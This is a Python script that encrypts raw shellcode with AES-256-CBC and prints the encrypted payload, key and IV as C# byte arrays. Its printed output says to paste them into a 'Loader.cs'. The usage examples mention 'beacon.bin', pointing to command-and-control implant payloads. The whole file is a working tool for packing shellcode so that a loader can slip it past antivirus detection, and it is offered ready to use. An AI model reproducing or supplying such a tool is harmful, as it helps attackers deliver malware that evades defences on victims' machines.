#!/usr/bin/env python3
"""
AES-256-CBC Shellcode Encryptor
Usage:
    python3 encrypt_shellcode.py <input.bin> [output.bin]
    python3 encrypt_shellcode.py calc.bin
    python3 encrypt_shellcode.py beacon.bin payload.enc
"""

import sys
import os
import base64
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes


def pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)


def encrypt_shellcode(shellcode: bytes) -> tuple[bytes, bytes, bytes]:
    key = get_random_bytes(32)   # AES-256
    iv = get_random_bytes(16)    # CBC IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(shellcode))
    return encrypted, key, iv


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <shellcode.bin> [output.enc]")
        sys.exit(1)

    input_path = sys.argv[1]
    output_path = sys.argv[2] if len(sys.argv) > 2 else input_path + ".enc"

    with open(input_path, "rb") as f:
        shellcode = f.read()

    print(f"[*] Read {len(shellcode)} bytes of shellcode from {input_path}")

    encrypted, key, iv = encrypt_shellcode(shellcode)

    with open(output_path, "wb") as f:
        f.write(encrypted)

    print(f"[*] Encrypted shellcode ({len(encrypted)} bytes) written to {output_path}")
    print()
    print("=" * 60)
    print("C# ARRAYS (copy into Loader.cs):")
    print("=" * 60)

    def bytes_to_csharp(data: bytes, name: str):
        lines = []
        for i in range(0, len(data), 16):
            chunk = data[i:i + 16]
            elements = ", ".join(f"0x{b:02X}" for b in chunk)
            if i + 16 < len(data):
                elements += ","
            lines.append("                " + elements)

        array_str = "\n".join(lines)
        print(f"\n        private static readonly byte[] {name} = new byte[{len(data)}] {{\n{array_str}\n        }};")

    bytes_to_csharp(encrypted, "EncryptedPayload")
    bytes_to_csharp(key, "AesKey")
    bytes_to_csharp(iv, "AesIv")

    print()
    print("[+] Done. Embed the arrays above into Loader.cs")


if __name__ == "__main__":
    main()